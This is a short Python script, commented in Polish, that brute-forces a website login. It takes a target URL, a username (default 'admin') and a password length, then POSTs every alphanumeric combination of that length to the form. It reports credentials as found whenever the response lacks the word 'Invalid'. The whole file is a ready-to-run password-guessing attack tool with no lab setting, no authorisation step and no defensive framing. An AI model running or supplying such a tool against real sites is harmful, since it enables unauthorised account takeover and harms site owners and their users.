import requests
import re
import itertools
import string

# === Walidacje ===
def validate_url(url):
    return re.match(r'^https?://', url)

def validate_username(username):
    return username.strip() != ""

# === Dane wejściowe ===
url = input('Enter site URL: ').strip()
if not validate_url(url):
    print("[-] Invalid URL. Must start with http:// or https://")
    exit()

username = input('Enter username (default = admin): ').strip()
if not username:
    username = "admin"
if not validate_username(username):
    print("[-] Invalid username.")
    exit()

try:
    length = int(input("Enter password length (e.g., 4): ").strip())
    if length < 1:
        raise ValueError
except ValueError:
    print("[-] Invalid password length.")
    exit()

# === Pełny zestaw znaków alfanumerycznych ===
charset = string.ascii_letters + string.digits  # a-zA-Z0-9

# === Generowanie haseł ===
print(f"[i] Generating passwords using charset: {charset}")
password_list = itertools.product(charset, repeat=length)

# === Brute-force ===
def brute_force():
    for p_tuple in password_list:
        password = ''.join(p_tuple)
        data = {"username": username, "password": password}
        try:
            response = requests.post(url, data=data, timeout=5)

            if "Invalid" not in response.text:
                print(f"[+] Found valid credentials: {username}:{password}")
                return
            else:
                print(f"[-] Attempted: {password}")
        except requests.RequestException as e:
            print(f"[!] Request failed: {e}")
            return

brute_force()
